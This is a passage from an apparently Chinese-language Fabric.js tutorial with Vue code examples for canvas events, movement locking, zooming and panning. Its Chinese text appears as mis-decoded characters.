<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(triangle.<span class="hljs-title function_">getLevel</span>()); <span class="hljs-comment">// 1</span>
</code></pre>
<h2 data-id="heading-45">äº‹ä»¶</h2>
<p><code>Fabric.js</code> æä¾›äº†ä¸€å¥—å¾ˆæ–¹ä¾¿çš„äº‹ä»¶ç³»ç»Ÿï¼Œå¯ä»¥ç”¨ <code>on</code> æ–¹æ³•å¯ä»¥åˆå§‹åŒ–äº‹ä»¶ç›‘å¬å™¨ï¼Œç”¨ <code>off</code> æ–¹æ³•å°†å…¶åˆ é™¤ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16b213fc2d534f2da65e140800c5869d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=vlKtlmzhV4T6%2F3LEjirM4Qwbv3k%3D" alt="045.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"addClickEvent"</span>&gt;</span>æ·»åŠ ç”»å¸ƒç‚¹å‡»äº‹ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"removeClickEvent"</span>&gt;</span>ç§»é™¤ç”»å¸ƒç‚¹å‡»äº‹ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">let</span> canvas = <span class="hljs-literal">null</span>

<span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#9896f1'</span>
  })

  <span class="hljs-comment">// ç»™çŸ©å½¢æ·»åŠ ä¸€ä¸ªé€‰ä¸­äº‹ä»¶</span>
  rect.<span class="hljs-title function_">on</span>(<span class="hljs-string">'selected'</span>, <span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é€‰ä¸­çŸ©å½¢å•¦'</span>, options)
  })
  canvas.<span class="hljs-title function_">add</span>(rect)

  <span class="hljs-title function_">addClickEvent</span>()
}

<span class="hljs-comment">// ç§»é™¤ç”»å¸ƒç‚¹å‡»äº‹ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">removeClickEvent</span>(<span class="hljs-params"/>) {
  canvas.<span class="hljs-title function_">off</span>(<span class="hljs-string">'mouse:down'</span>)
}

<span class="hljs-comment">// æ·»åŠ ç”»å¸ƒç‚¹å‡»äº‹ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addClickEvent</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">removeClickEvent</span>() <span class="hljs-comment">// åœ¨æ·»åŠ äº‹ä»¶ä¹‹å‰å…ˆæŠŠè¯¥äº‹ä»¶æ¸…é™¤æ‰ï¼Œä»¥å…é‡å¤æ·»åŠ </span>
  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`xè½´åæ ‡: <span class="hljs-subst">${options.e.clientX}</span>;    yè½´åæ ‡: <span class="hljs-subst">${options.e.clientY}</span>`</span>)
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-46">ç¦æ­¢æ“ä½œæ¡†çš„éƒ¨åˆ†åŠŸèƒ½</h2>
<h3 data-id="heading-47">ç¦æ­¢æ°´å¹³ç§»åŠ¨</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3506969d0418476bab5731bc2f370d1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=OO0dpUJyvlkMSF%2FHz799z4HvQjY%3D" alt="047.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ffde7d'</span>
  })

  <span class="hljs-comment">// ä¸å…è®¸æ°´å¹³ç§»åŠ¨</span>
  rect.<span class="hljs-property">lockMovementX</span> = <span class="hljs-literal">true</span>

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-48">ç¦æ­¢å‚ç›´ç§»åŠ¨</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e83327b48c342f0a1a215ad38f63a7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=VL9iM6Py0yxazvdoN9cIo1TPz28%3D" alt="048.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f6416c'</span>
  })

  <span class="hljs-comment">// ä¸å…è®¸å‚ç›´ç§»åŠ¨</span>
  rect.<span class="hljs-property">lockMovementY</span> = <span class="hljs-literal">true</span>

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-49">ç¼©æ”¾å’Œå¹³ç§»ç”»å¸ƒ</h2>
<h3 data-id="heading-50">ç¼©æ”¾ç”»å¸ƒ</h3>
<h4 data-id="heading-51">ä»¥åŸç‚¹ä¸ºåŸºå‡†ç¼©æ”¾ç”»å¸ƒ</h4>
<p>éœ€è¦ç›‘å¬é¼ æ ‡çš„æ»šè½®äº‹ä»¶ï¼š<code>mouse:wheel</code>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ac81a86a671486ba52b8d2fd21195bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=CLwIJ8anp275rgPkiFt565DIYIo%3D" alt="052.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// çŸ©å½¢</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>
  })

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(rect, circle) <span class="hljs-comment">// å°†çŸ©å½¢å’Œåœ†å½¢æ·»åŠ åˆ°ç”»å¸ƒä¸­</span>

  <span class="hljs-comment">// ç›‘å¬é¼ æ ‡æ»šè½®äº‹ä»¶</span>
  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:wheel'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> {
    <span class="hljs-keyword">let</span> delta = opt.<span class="hljs-property">e</span>.<span class="hljs-property">deltaY</span> <span class="hljs-comment">// æ»šè½®å‘ä¸Šæ»šä¸€ä¸‹æ˜¯ -100ï¼Œå‘ä¸‹æ»šä¸€ä¸‹æ˜¯ 100</span>
    <span class="hljs-keyword">let</span> zoom = canvas.<span class="hljs-title function_">getZoom</span>() <span class="hljs-comment">// è·å–ç”»å¸ƒå½“å‰ç¼©æ”¾å€¼</span>

    <span class="hljs-comment">// æ§åˆ¶ç¼©æ”¾èŒƒå›´åœ¨ 0.01~20 çš„åŒºé—´å†…</span>
    zoom *= <span class="hljs-number">0.999</span> ** delta
    <span class="hljs-keyword">if</span> (zoom &gt; <span class="hljs-number">20</span>) zoom = <span class="hljs-number">20</span>
    <span class="hljs-keyword">if</span> (zoom &lt; <span class="hljs-number">0.01</span>) zoom = <span class="hljs-number">0.01</span>

    <span class="hljs-comment">// è®¾ç½®ç”»å¸ƒç¼©æ”¾æ¯”ä¾‹</span>
    canvas.<span class="hljs-title function_">setZoom</span>(zoom)
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-52">ä»¥é¼ æ ‡æŒ‡é’ˆä¸ºåŸºå‡†ç¼©æ”¾ç”»å¸ƒ</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d088f94b09644deb9c144f358b85420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=j2G5CKuTfCJ5kLpdH%2FPSkesX8ZU%3D" alt="053.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// çŸ©å½¢</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>
  })

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(rect, circle) <span class="hljs-comment">// å°†çŸ©å½¢å’Œåœ†å½¢æ·»åŠ åˆ°ç”»å¸ƒä¸­</span>

  <span class="hljs-comment">// ç›‘å¬é¼ æ ‡æ»šè½®äº‹ä»¶</span>
  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:wheel'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> {
    <span class="hljs-keyword">let</span> delta = opt.<span class="hljs-property">e</span>.<span class="hljs-property">deltaY</span> <span class="hljs-comment">// æ»šè½®å‘ä¸Šæ»šä¸€ä¸‹æ˜¯ -100ï¼Œå‘ä¸‹æ»šä¸€ä¸‹æ˜¯ 100</span>
    <span class="hljs-keyword">let</span> zoom = canvas.<span class="hljs-title function_">getZoom</span>() <span class="hljs-comment">// è·å–ç”»å¸ƒå½“å‰ç¼©æ”¾å€¼</span>

    <span class="hljs-comment">// æ§åˆ¶ç¼©æ”¾èŒƒå›´åœ¨ 0.01~20 çš„åŒºé—´å†…</span>
    zoom *= <span class="hljs-number">0.999</span> ** delta
    <span class="hljs-keyword">if</span> (zoom &gt; <span class="hljs-number">20</span>) zoom = <span class="hljs-number">20</span>
    <span class="hljs-keyword">if</span> (zoom &lt; <span class="hljs-number">0.01</span>) zoom = <span class="hljs-number">0.01</span>

    <span class="hljs-comment">// è®¾ç½®ç”»å¸ƒç¼©æ”¾æ¯”ä¾‹</span>
    <span class="hljs-comment">// å…³é”®ç‚¹ï¼ï¼ï¼</span>
    <span class="hljs-comment">// å‚æ•°1ï¼šå°†ç”»å¸ƒçš„æ‰€æ”¾ç‚¹è®¾ç½®æˆé¼ æ ‡å½“å‰ä½ç½®</span>
    <span class="hljs-comment">// å‚æ•°2ï¼šä¼ å…¥ç¼©æ”¾å€¼</span>
    canvas.<span class="hljs-title function_">zoomToPoint</span>(
      {
        <span class="hljs-attr">x</span>: opt.<span class="hljs-property">e</span>.<span class="hljs-property">offsetX</span>, <span class="hljs-comment">// é¼ æ ‡xè½´åæ ‡</span>
        <span class="hljs-attr">y</span>: opt.<span class="hljs-property">e</span>.<span class="hljs-property">offsetY</span>  <span class="hljs-comment">// é¼ æ ‡yè½´åæ ‡</span>
      },
      zoom <span class="hljs-comment">// æœ€åè¦ç¼©æ”¾çš„å€¼</span>
    )
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-53">å¹³ç§»ç”»å¸ƒ</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// åˆå§‹åŒ–ç”»å¸ƒ</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// çŸ©å½¢</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">130</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>
  })

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">150</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(rect, circle) <span class="hljs-comment">// å°†çŸ©å½¢å’Œåœ†å½¢æ·»åŠ åˆ°ç”»å¸ƒä¸­</span>

  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> { <span class="hljs-comment">// é¼ æ ‡æŒ‰ä¸‹æ—¶è§¦å‘</span>
    <span class="hljs-keyword">let</span> evt = opt.<span class="hljs-property">e</span>
    <span class="hljs-keyword">if</span> (evt.<span class="hljs-property">altKey</span> === <span class="hljs-literal">true</span>) { <span class="hljs-comment">// æ˜¯å¦æŒ‰ä½alt</span>
      canvas.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// isDragging æ˜¯è‡ªå®šä¹‰çš„ï¼Œå¼€å¯ç§»åŠ¨çŠ¶æ€</span>
      canvas.<span class="hljs-property">lastPosX</span> = evt.<span class="hljs-property">clientX</span> <span class="hljs-comment">// lastPosX æ˜¯è‡ªå®šä¹‰çš„</span>
      canvas.<span class="hljs-property">lastPosY</span> = evt.<span class="hljs-property">clientY</span> <span class="hljs-comment">// lastPosY æ˜¯è‡ªå®šä¹‰çš„</span>
    }
  })

  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:move'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> { <span class="hljs-comment">// é¼ æ ‡ç§»åŠ¨æ—¶è§¦å‘</span>
    <span class="hljs-keyword">if</span> (canvas.<span class="hljs-property">isDragging</span>) {
      <span class="hljs-keyword">let</span> evt = opt.<span class="hljs-property">e</span>
      <span class="hljs-keyword">let</span> vpt = canvas.<span class="hljs-property">viewportTransform</span> <span class="hljs-comment">// èšç„¦è§†å›¾çš„è½¬æ¢</span>
      vpt[<span class="hljs-number">4</span>] += evt.<span class="hljs-property">clientX</span> - canvas.<span class="hljs-property">lastPosX</span>
      vpt[<span class="hljs-number">5</span>] += evt.<span class="hljs-property">clientY</span> - canvas.<span class="hljs-property">lastPosY</span>
      canvas.<span class="hljs-title function_">requestRenderAll</span>() <span class="hljs-comment">// é‡æ–°æ¸²æŸ“</span>
      canvas.<span class="hljs-property">lastPosX</span>  = evt.<span class="hljs-property">clientX</span>
      canvas.<span class="hljs-property">lastPosY</span>  = evt.<span class="hljs-property">clientY</span>
    }
  })

  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:up'</span>, <span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> { <span class="hljs-comment">// é¼ æ ‡æ¾å¼€æ—¶è§¦å‘</span>
    canvas.<span class="hljs-title function_">setViewportTransform</span>(canvas.<span class="hljs-property">viewportTransform</span>) <span class="hljs-comment">// è®¾ç½®æ­¤ç”»å¸ƒå®ä¾‹çš„è§†å£è½¬æ¢  </span>
    canvas.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// å…³é—­ç§»åŠ¨çŠ¶æ€</span>
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-54">è·å–çœŸå®çš„è½¬æ¢åæ ‡</h3>
<p>åœ¨å›¾åƒå¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šç”¨åˆ°åæ ‡ç‚¹ä¿¡æ¯ï¼Œä»¥ä¾¿äºè¿›è¡Œä¸€äº›äº¤äº’æ“ä½œã€‚</p>
<p>æ­¤å¤„ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå½“é¼ æ ‡ç‚¹å‡»æ—¶ï¼Œåœ¨é¼ æ ‡çš„ä½ç½®åˆ›å»ºä¸€ä¸ªæ–¹å—å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// å½“é¼ æ ‡æŒ‰ä¸‹æ—¶</span>
      canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">option</span>) {
        <span class="hljs-keyword">const</span> evt = option.<span class="hljs-property">e</span>;
        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå°æ–¹å—</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
          <span class="hljs-attr">left</span>: evt.<span class="hljs-property">offsetX</span>,
          <span class="hljs-attr">top</span>: evt.<span class="hljs-property">offsetY</span>,
          <span class="hljs-attr">width</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-string">'yellow'</span>
        }))
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderAll</span>();
      });
</code></pre>
